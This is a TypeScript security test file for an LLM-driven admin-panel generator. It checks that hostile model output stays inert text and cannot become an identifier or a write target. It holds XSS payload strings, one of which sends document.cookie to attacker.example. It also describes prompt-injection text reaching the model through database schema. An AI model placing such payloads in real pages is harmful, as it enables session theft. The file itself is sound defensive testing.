// SPDX-License-Identifier: AGPL-3.0-only
/**
 * ADVERSARIAL MODEL OUTPUT — the first security fixtures in this repo.
 *
 * Everything else under `test/fixtures/responses/` is a SCHEMA-validation
 * fixture: `invalid-dangling-fk`, `invalid-bad-json`, `invalid-unknown-column`.
 * Those model a confused LLM. These two model a hostile one — either because
 * the operator pointed Studio at a provider that returned something nasty, or
 * (far more likely) because the DATABASE the prompt serialized contains
 * attacker-controlled text. `prompt/serializer.ts` sends the operator's real
 * table names, column names, comments and enum values to the model; on any
 * multi-tenant admin panel a slice of that is user input, and the model happily
 * echoes it back inside a label.
 *
 * ─── WHY THESE ARE NOT `CORPUS` ENTRIES ─────────────────────────────────────
 *
 * `response/validate.test.ts` drives its corpus off
 * `{ file, code: LlmValidationCode, path, fatal }` and asserts
 * `errors.find(e => e.code === code)` is defined. There is no XSS or injection
 * member of `LLM_VALIDATION_CODES`, and there should not be: `L10n` is
 * `z.record(z.string(), z.string().min(1))`, so `<script>` in a label is a
 * PERFECTLY VALID response and rejecting it would be the wrong contract — a
 * German column really can be called `Größe <-> Gewicht`, and a validator that
 * second-guesses free text starts mangling honest data. So a corpus row would
 * fail whichever code it named. These get their own block, asserting different
 * properties: not "is it rejected" but "where can it possibly END UP".
 *
 * ─── THE TWO PROPERTIES ─────────────────────────────────────────────────────
 *
 * 1. `xss-microcopy` — markup in free text stays INERT TEXT. The pipeline does
 *    not sanitize (asserted below, deliberately), so the guarantee rests
 *    entirely on the render layer never interpolating a string into raw HTML.
 *    That is a real, currently-true property of this codebase — there is not
 *    one `dangerouslySetInnerHTML` in it — and it is exactly the kind of
 *    property that dies quietly the day someone reaches for it to render a
 *    markdown description. So it is asserted structurally.
 *
 * 2. `override-instruction` — instruction-shaped text cannot ESCAPE INTO A
 *    CLOSED VOCABULARY. A sentence can land in a label; it must never become a
 *    widget id, a table name, a page template, a nav-group slug or a write
 *    target. Every structural position in the contract is either a Zod-level
 *    pattern (`Slug`, `LucideIcon`) or a referential membership check, and this
 *    asserts the whole set at once rather than one code at a time.
 *
 * Both are written to FAIL on a regression, not to describe today's output.
 */
import { existsSync, readFileSync, readdirSync } from 'node:fs';
import { join } from 'node:path';
import { fileURLToPath } from 'node:url';

import { classifyModel, parseDatabaseModel, type DatabaseModel } from '@adminium/engine';
import { describe, expect, it } from 'vitest';

import { diffEnrichment } from './apply/diff.js';
import { normalizeHeuristicBaseline, normalizeLlmResponse } from './apply/normalize.js';
import { buildApplyPlan, type OverrideField } from './apply/plan.js';
import { validateResponse, type ValidationContext } from './response/validate.js';

/* --------------------------------------------------------------- fixtures */

function fixture(relative: string): string {
  return readFileSync(new URL(`../test/fixtures/${relative}`, import.meta.url), 'utf8');
}

const snapshot: DatabaseModel = parseDatabaseModel(fixture('demo-schema.json'));

/**
 * The same two vocabularies `response/validate.test.ts` and `apply/plan.test.ts`
 * declare. They are duplicated rather than imported because `plan.ts`'s own
 * header explains the boundary: the allow-lists are INJECTED as plain data so
 * `@adminium/llm` never depends on the render layer (01-architecture.md §2.3).
 *
 * For a security test the duplication is harmless in the direction that
 * matters: the assertions below check that survivors are a SUBSET of the list
 * fed into the context, so the two are the same list by construction. A stale
 * copy makes this test stricter, never weaker.
 */
const ALLOWED_TEMPLATES = [
  'page-dashboard',
  'page-master-detail',
  'page-queue-inbox',
  'page-board',
  'page-calendar',
  'page-scheduler',
  'page-directory',
  'page-log-viewer',
  'page-files',
  'page-chat',
] as const;

const ALLOWED_WIDGETS = [
  'kpi-stat-card',
  'kpi-progress',
  'kpi-delta',
  'chart-line-area',
  'chart-bar',
  'chart-donut',
  'chart-multiline',
  'chart-stacked-bar-100',
  'chart-funnel',
  'chart-heatmap-calendar',
  'chart-cohort-matrix',
  'chart-ranking-bars',
  'chart-sparkline',
  'mini-table',
  'top-movers-list',
  'activity-feed',
] as const;

const ctx: ValidationContext = {
  snapshot,
  locales: ['en_US'],
  allowedTemplates: ALLOWED_TEMPLATES,
  allowedWidgets: ALLOWED_WIDGETS,
};

/* ------------------------------------------------------------- path walker */

/**
 * Every JSON path in `value` whose STRING or OBJECT KEY contains `needle`, with
 * array indices normalized to `[]`.
 *
 * Object keys are walked as well as values, and that is not pedantry: `L10n`
 * and `EnumSuggestion.tones` are records whose KEYS are model-supplied, so a
 * key is a place attacker text can sit. Reporting the path rather than a
 * boolean is what makes a failure readable — the message names the field the
 * text escaped into.
 */
function pathsContaining(value: unknown, needle: string, path = ''): string[] {
  if (typeof value === 'string') return value.includes(needle) ? [path] : [];
  if (Array.isArray(value)) {
    return value.flatMap((item) => pathsContaining(item, needle, `${path}[]`));
  }
  if (typeof value === 'object' && value !== null) {
    return Object.entries(value).flatMap(([key, item]) => {
      const here = path === '' ? key : `${path}.${key}`;
      const fromKey = key.includes(needle) ? [`${here} (as a key)`] : [];
      return [...fromKey, ...pathsContaining(item, needle, here)];
    });
  }
  return [];
}

/* ═══════════════════════════════ 1. xss-microcopy ═══════════════════════════ */

describe('xss-microcopy — model markup must stay inert text', () => {
  const raw = fixture('responses/xss-microcopy.json');
  const result = validateResponse(raw, ctx);

  it('is a VALID response — the pipeline is not, and must not be, a sanitizer', () => {
    // If this ever starts erroring, someone taught the validator to reject
    // markup. That is the wrong layer: it would break legitimate labels
    // (`<untitled>`, `a < b`, `Größe <-> Gewicht`) while an attacker just moves
    // one field over. Escaping belongs at render time, once, for every string.
    expect(result.errors).toEqual([]);
    expect(result.warnings).toEqual([]);
    expect(result.response).toBeDefined();
  });

  it('carries the markup through validate byte-identical — nothing is silently rewritten', () => {
    // The point of asserting EQUALITY rather than "contains something" is that
    // a half-measure is worse than none: a validator that strips `<script>` but
    // not `<img onerror>` would make this test pass while leaving the hole
    // open, and would also give reviewers false confidence that the data is
    // already clean by the time it reaches a component.
    const table = result.response?.tables[0];
    expect(table?.label['en_US']).toBe(
      '<img src=x onerror="fetch(\'https://attacker.example/?c=\'+document.cookie)">Orders',
    );
    expect(table?.microcopy?.emptyState.headline['en_US']).toBe(
      "<script>alert('headline')</script>No orders yet",
    );
    expect(table?.microcopy?.pageSubtitle['en_US']).toBe(
      '"><svg onload=alert(\'subtitle\')>Track and fulfil orders',
    );
    expect(result.response?.dashboards[0]?.widgets[0]?.titleEn).toBe(
      "<img src=x onerror=alert('widget')>Revenue",
    );
  });

  it('carries it through normalize + plan unchanged — no template interpolation anywhere', () => {
    // The apply planner builds page titles, layout configs and override values
    // out of these strings. If any step ever built MARKUP from them (a
    // `title="${label}"` attribute, a generated HTML snippet), the round-trip
    // would no longer be identity and this would fail.
    const response = result.response;
    expect(response).toBeDefined();
    if (!response) return;

    const llm = normalizeLlmResponse(response);
    const heuristic = normalizeHeuristicBaseline(snapshot, classifyModel(snapshot));
    const diff = diffEnrichment(llm, heuristic);
    const plan = buildApplyPlan(
      diff,
      diff.map((row) => row.id),
      { connectionId: 'demo-shop' },
    );

    const serialized = JSON.stringify(plan);
    for (const payload of [
      "<script>alert('headline')</script>No orders yet",
      "<img src=x onerror=alert('widget')>Revenue",
      '"><svg onload=alert(\'subtitle\')>Track and fulfil orders',
    ]) {
      // JSON.stringify escapes `"` as `\"`, nothing else here — so the payload
      // is compared in its serialized spelling.
      expect(serialized.includes(JSON.stringify(payload).slice(1, -1))).toBe(true);
    }

    // …and the markup never grew a sibling: no key in any write descriptor is
    // named like an HTML sink. This is the cheap half of the guard below.
    expect(serialized).not.toMatch(/dangerouslySetInnerHTML|innerHTML|__html/);
  });

  it('no render surface interpolates a string into raw HTML', () => {
    // ─── WHY THIS TEST LIVES IN @adminium/llm ──────────────────────────────
    //
    // Because this is the package that MANUFACTURES the untrusted strings. The
    // guarantee above ("markup stays inert") is not enforceable anywhere inside
    // this package — it is enforced by React escaping text nodes, which is only
    // true while no component opts out. So the assertion has to reach across
    // the boundary and check the opt-out is unused. Scanning source text is the
    // established shape here (`packages/engine/test/browser-safe.test.ts`,
    // `packages/i18n/scripts/gen-a11y-keys.mjs` both do it).
    //
    // If you ever legitimately need raw HTML — a markdown-rendered description,
    // a rich-text column — this test is the conversation: sanitize at the sink
    // with a real sanitizer, and narrow the scan to exclude that one file, with
    // the reason. Do not delete the test.
    const repoRoot = fileURLToPath(new URL('../../../', import.meta.url));

    /** Every tree that can render a model-supplied string. */
    const ROOTS = [
      'apps/dashboard/src',
      'apps/desktop/src/renderer',
      'packages/ui/src',
      'packages/widgets/src',
      'packages/charts/src',
    ];

    /**
     * React's escape hatches plus the three DOM ones. `.innerHTML` must match
     * an ASSIGNMENT (`= ` but not `==`): reading `el.innerHTML` in a test
     * assertion is harmless and several suites do it.
     */
    const SINKS =
      /dangerouslySetInnerHTML|__html\s*:|\.(?:inner|outer)HTML\s*=(?!=)|insertAdjacentHTML|document\.write\(/;

    function walk(dir: string): string[] {
      const out: string[] = [];
      for (const entry of readdirSync(dir, { withFileTypes: true })) {
        if (entry.name === 'node_modules' || entry.name === 'dist') continue;
        const full = join(dir, entry.name);
        if (entry.isDirectory()) out.push(...walk(full));
        else if (/\.tsx?$/.test(entry.name)) out.push(full);
      }
      return out;
    }

    const offenders: string[] = [];
    let scanned = 0;
    for (const root of ROOTS) {
      const dir = join(repoRoot, root);
      // A scan with nothing to scan is not a check — if a tree moves, fail
      // loudly rather than passing green over an unexamined render layer.
      expect(existsSync(dir), `${root} not found — update ROOTS`).toBe(true);
      for (const file of walk(dir)) {
        scanned += 1;
        if (SINKS.test(readFileSync(file, 'utf8'))) {
          offenders.push(file.slice(repoRoot.length));
        }
      }
    }

    expect(scanned).toBeGreaterThan(500);
    expect(offenders, 'a raw-HTML sink exists on a surface that renders LLM copy').toEqual([]);
  });
});

/* ═══════════════════════════ 2. override-instruction ════════════════════════ */

describe('override-instruction — instruction text cannot escape into a vocabulary', () => {
  /** The marker every injected value carries, structural and textual alike. */
  const MARKER = 'SYSTEM_OVERRIDE';

  const result = validateResponse(fixture('responses/override-instruction.json'), ctx);
  const response = result.response;

  it('does not fail the run — every hostile suggestion is a per-item drop', () => {
    // A prompt-injection attempt must not become a denial of service on the
    // enrichment feature: the honest suggestions in the same response still
    // apply. Every error here is `item`, none is `fatal`.
    expect(response).toBeDefined();
    expect(result.errors.length).toBeGreaterThan(0);
    expect(result.errors.every((error) => error.severity === 'item')).toBe(true);
  });

  it('rejects the hostile value in EVERY structural position it was offered', () => {
    // One code per position, so a regression in any single check is named
    // rather than hidden behind a total.
    expect(result.errors.map((error) => [error.code, error.path])).toEqual([
      ['LLM_UNKNOWN_COLUMN', 'tables[0].columns[0].column'],
      ['LLM_UNKNOWN_TEMPLATE', 'tables[0].pageTemplates[0].template'],
      ['LLM_UNKNOWN_TABLE', 'tables[1].table'],
      ['LLM_NOT_AN_ENUM', 'enums[0].table'],
      ['LLM_RELATION_INVALID', 'relations.inferred[0]'],
      ['LLM_GROUP_INVALID', 'navGroups[0].tables'],
      ['LLM_UNKNOWN_WIDGET', 'dashboards[0].widgets[0].widget'],
      ['LLM_WIDGET_BINDING', 'dashboards[0].widgets[1].table'],
    ]);
  });

  it('every surviving structural value comes from a closed vocabulary', () => {
    expect(response).toBeDefined();
    if (!response) return;

    const realTables = new Set(snapshot.tables.map((t) => t.id));
    const columnsOf = new Map(
      snapshot.tables.map((t) => [t.id, new Set(t.columns.map((c) => c.name))]),
    );
    /** `Slug` in response/schema.ts — kebab-case, so never a path or a route. */
    const SLUG = /^[a-z0-9]+(-[a-z0-9]+)*$/;

    for (const table of response.tables) {
      expect(realTables.has(table.table)).toBe(true);
      for (const column of table.columns) {
        expect(columnsOf.get(table.table)?.has(column.column)).toBe(true);
      }
      for (const template of table.pageTemplates) {
        expect(ALLOWED_TEMPLATES).toContain(template.template);
      }
    }
    for (const group of response.navGroups) {
      expect(group.id).toMatch(SLUG);
      for (const table of group.tables) expect(realTables.has(table)).toBe(true);
    }
    for (const dashboard of response.dashboards) {
      expect(dashboard.id).toMatch(SLUG);
      for (const table of dashboard.tables) expect(realTables.has(table)).toBe(true);
      for (const widget of dashboard.widgets) {
        expect(ALLOWED_WIDGETS).toContain(widget.widget);
        expect(realTables.has(widget.table)).toBe(true);
      }
    }
    for (const relation of response.relations.inferred) {
      expect(realTables.has(relation.fromTable)).toBe(true);
      expect(realTables.has(relation.toTable)).toBe(true);
    }
    for (const entry of response.enums) expect(realTables.has(entry.table)).toBe(true);
  });

  it('leaves the instruction ONLY in free-text fields — never an id, name or slug', () => {
    // The whole property in one assertion. Every surviving occurrence of the
    // marker is listed by path; the list must be a subset of the fields whose
    // contract is "prose a human reads". If a future change lets the text reach
    // `dashboards[].id`, `tables[].table` or `…widgets[].widget`, the path shows
    // up here and the test names it.
    expect(response).toBeDefined();
    if (!response) return;

    /** Fields whose value is displayed to a human and interpreted by nothing. */
    const TEXT_FIELDS = new Set([
      'tables[].label.en_US',
      'tables[].description.en_US',
      'tables[].columns[].label.en_US',
      'tables[].columns[].description.en_US',
      'tables[].microcopy.emptyState.headline.en_US',
      'tables[].microcopy.emptyState.guidance.en_US',
      'tables[].microcopy.pageSubtitle.en_US',
      'tables[].pageTemplates[].reason',
      'tables[].pageTemplates[].triggers[]',
      'enums[].reason',
      'relations.confirmed[].semantics',
      'relations.inferred[].evidence',
      'navGroups[].label.en_US',
      'dashboards[].label.en_US',
      'dashboards[].widgets[].titleEn',
      'dashboards[].widgets[].reason',
      'notes[]',
    ]);

    const found = pathsContaining(response, MARKER);
    expect(found.length).toBeGreaterThan(0); // the fixture must still be hostile
    expect(found.filter((path) => !TEXT_FIELDS.has(path))).toEqual([]);
  });

  it('plans no write whose TARGET is derived from the instruction', () => {
    // The last mile: `buildApplyPlan` is what a human confirms in the review
    // modal, and its descriptors are what the server executor turns into rows
    // in `adminium_schema_overrides` / `adminium_pages`. Text may ride along in
    // a value; the target of every write must be something the snapshot and the
    // registries already knew about.
    expect(response).toBeDefined();
    if (!response) return;

    const llm = normalizeLlmResponse(response);
    const heuristic = normalizeHeuristicBaseline(snapshot, classifyModel(snapshot));
    const diff = diffEnrichment(llm, heuristic);
    const plan = buildApplyPlan(
      diff,
      diff.map((row) => row.id),
      { connectionId: 'demo-shop' },
    );

    const realTables = new Set(snapshot.tables.map((t) => t.id));
    const SLUG = /^[a-z0-9]+(-[a-z0-9]+)*$/;
    /**
     * `OverrideField` in apply/plan.ts, spelled out. Note what is NOT in it and
     * cannot be: there is no role, permission, route or SQL field anywhere in
     * the write vocabulary, so "grant every user the admin role" has no
     * descriptor to become even if every membership check above were bypassed.
     */
    const OVERRIDE_FIELDS: readonly OverrideField[] = [
      'label',
      'key',
      'pii',
      'copy',
      'enum_semantics',
      'virtual_relation',
      'relation_suppressed',
    ];

    expect(plan.writes.length).toBeGreaterThan(0);
    for (const write of plan.writes) {
      if (write.target === 'override') {
        expect(OVERRIDE_FIELDS).toContain(write.field);
        expect(realTables.has(write.table)).toBe(true);
        continue;
      }
      switch (write.kind) {
        case 'nav-group':
          expect(write.group).toMatch(SLUG);
          for (const table of write.tables) expect(realTables.has(table)).toBe(true);
          break;
        case 'template-page':
          expect(ALLOWED_TEMPLATES).toContain(write.template);
          expect(realTables.has(write.table)).toBe(true);
          break;
        case 'dashboard-page':
          expect(write.dashboard).toMatch(SLUG);
          for (const table of write.tables) expect(realTables.has(table)).toBe(true);
          for (const item of write.layout.items) {
            expect(ALLOWED_WIDGETS).toContain(item.widget);
          }
          break;
      }
    }

    // Same subset check as on the response, now over the plan. Only three
    // places may hold the marker, and all three are text a human reads:
    /** Displayed copy inside a write's payload — never part of a target. */
    const PLAN_TEXT_FIELDS = new Set([
      'writes[].value.label.en_US', // the table label+description+icon bundle
      'writes[].value.description.en_US',
      'writes[].layout.items[].config.title', // the widget's titleEn
    ]);
    // `suggestionId`, `table`, `column`, `group`, `dashboard`, `template` and
    // every layout item's `widget` are derived from vocabulary members, so the
    // marker turning up in one of them means an identifier was built out of
    // free text — which is the exact failure this fixture exists to catch.
    const escaped = pathsContaining(plan, MARKER).filter((path) => !PLAN_TEXT_FIELDS.has(path));
    expect(escaped).toEqual([]);
  });
});
